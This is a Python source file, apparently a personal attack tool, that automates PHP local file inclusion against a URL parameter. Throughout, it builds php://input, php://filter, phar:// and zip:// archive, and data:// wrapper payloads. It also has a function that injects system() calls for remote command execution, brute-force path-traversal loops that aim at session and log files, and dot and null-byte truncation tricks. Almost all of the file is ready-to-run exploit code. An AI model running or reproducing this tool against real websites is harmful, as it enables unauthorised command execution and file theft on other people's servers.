# -*- coding: utf-8 -*-
# @Author:varcer
import req
import zipfile
import sys
import base64
import file
def fi_input(url,data='<?php phpinfo();?>'):
    temp=url.split("=")
    url=temp[0]+'='+'php://input'
    req.req(url,data)

def fi_filter(url,file='index.php',waf=False):
    temp=url.split('=')
    #如果有waf去掉read
    if waf:
        url = temp[0] + "=" + 'php://filter/convert.base64-encode/resource=' + file
    else:
        url=temp[0]+"="+'php://filter/read=convert.base64-encode/resource='+file
    req.req(url)
def fi_phar(url,data='<?php phpinfo();?>'):
    azip=zipfile.ZipFile('phar.zip','w')
    azip.writestr('phar.php', data=data, compress_type=zipfile.ZIP_DEFLATED)
    azip.close()
    temp = url.split("=")
    path=sys.path[0]+"\phar.zip\phar.php"
    url = temp[0] + '=' +"phar://"+path
    req.req(url)
def fi_zip(url,data='<?php phpinfo();?>'):
    temp = url.split("=")
    azip = zipfile.ZipFile('phar.zip', 'w')
    azip.writestr('phar.php', data=data, compress_type=zipfile.ZIP_DEFLATED)
    azip.close()
    path = sys.path[0] + "\phar.zip%23phar.php"
    url = temp[0] + '=' + "zip://" + path
    req.req(url)
def data_text(url,data='<?php phpinfo();?>',b64=False):
    temp=url.split("=")
    if b64:
        url=temp[0]+"=data:text/plain;base64,"+data
    else:
        url=temp[0]+"=data:text/plain,"+data
    req.req(url)
def CMD(url,level,cmd='dir'):
    if int(level)==1:
        data = "<?php system('" + cmd + "');?>"
        fi_input(url,data)
    elif int(level)==2:
        data = "<?php system('" + cmd + "');?>"
        fi_phar(url,data)
    elif int(level)==3:
        data = "<?php system('" + cmd + "');?>"
        fi_zip(url,data)
    elif int(level)==0:
        data=str(base64.b64encode(("<?php system('" + cmd + "');?>").encode())).split("'")[1]
        data_text(url, data, True)
def session(url,data="<?php phpinfo();?>"):
    temp=url.split("=")
    url=temp[0]+"="
    for fi in file.session_file:
        bar = file.session_file.index(fi) * 100 / (len(file.session_file) - 1)
        sys.stdout.write("  完成:" + str(int(bar)) + '%' + '\r')
        sys.stdout.flush()
        file_route=fi.replace('PHPSESSID',data)
        if "D:" not in fi and "C:" not in fi and "E:" not in fi:
            char=''
            if file_route.startswith("\\") or file_route.startswith("/"):
                for long in range(20):
                    if "/" in file_route:
                        pylode=char+file_route
                        req.req(url+pylode)
                        char+="/.."
                    else:
                        pylode = char + file_route
                        req.req(url+pylode)
                        char+="\.."
            else:
                if "/" in file_route:
                    for i in range(20):
                        pylode = char +"/"+file_route
                        req.req(url+pylode)
                        char += "/.."
                else:
                    for i in range(20):
                        pylode = char + "\\" + file_route
                        req.req(url+pylode)
                        char += "\.."
        else:
            req.req(url+file_route)
def log(url):
    temp=url.split("=")
    url=temp[0]+"="
    for fi in file.log_file:
        bar=file.log_file.index(fi)*100/(len(file.log_file)-1)
        sys.stdout.write("  完成:"+str(int(bar))+'%'+'\r')
        sys.stdout.flush()
        file_route=fi
        if "D:" not in fi and "C:" not in fi and "E:" not in fi:
            char=''
            if file_route.startswith("\\") or file_route.startswith("/"):
                for long in range(20):
                    if "/" in file_route:
                        pylode=char+file_route
                        req.req(url+pylode)
                        char+="/.."
                    else:
                        pylode = char + file_route
                        req.req(url+pylode)
                        char+="\.."
            else:
                if "/" in file_route:
                    for i in range(20):
                        pylode = char +"/"+file_route
                        req.req(url+pylode)
                        char += "/.."
                else:
                    for i in range(20):
                        pylode = char + "\\" + file_route
                        req.req(url+pylode)
                        char += "\.."
        else:
            req.req(url+file_route)
def dot(url,file,sum=256):
    temp = url.split("=")
    url = temp[0] + "="
    sum=sum
    url1= url + file
    url2=url+file+'/'
    url3=url+file+'\\'
    for i in range(int(sum)):
        url1=url1
        req.req(url1)
        url1 = url1 + '.'

        url2 =url2
        req.req(url2)
        url2 = url2 + "./"

        url3 = url3
        req.req(url3)
        url3 = url3 + ".\\"
    url4=url+file+'%00'
    req.req(url4)
    print(url4)


